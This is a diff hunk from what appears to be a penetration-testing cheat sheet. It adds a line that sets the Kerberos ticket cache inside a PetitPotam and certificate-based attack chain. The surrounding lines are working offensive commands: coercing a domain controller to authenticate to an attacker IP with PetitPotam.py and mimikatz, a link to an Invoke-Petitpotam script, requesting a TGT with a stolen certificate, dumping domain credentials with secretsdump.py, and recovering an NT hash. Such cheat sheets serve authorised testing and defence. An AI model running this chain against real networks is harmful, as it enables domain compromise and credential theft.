@@ -1003,6 +1003,7 @@ $ python3 PetitPotam.py <Attacker IP address> <Domain Controller IP address>
 mimikatz # misc::efs /server:<Domain Controller IP address> /connect:<Attacker IP address>
 https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1
 $ python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<machine account>\$ -pfx-base64 <base64 certificate> = dc01.ccache
+$ export KRB5CCNAME=dc01.ccache
 $ secretsdump.py -just-dc-user <domain>/<username> -k -no-pass "<machine account>$"@<hostname>
 $ klist
 $ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 <domain>/<machine account>$
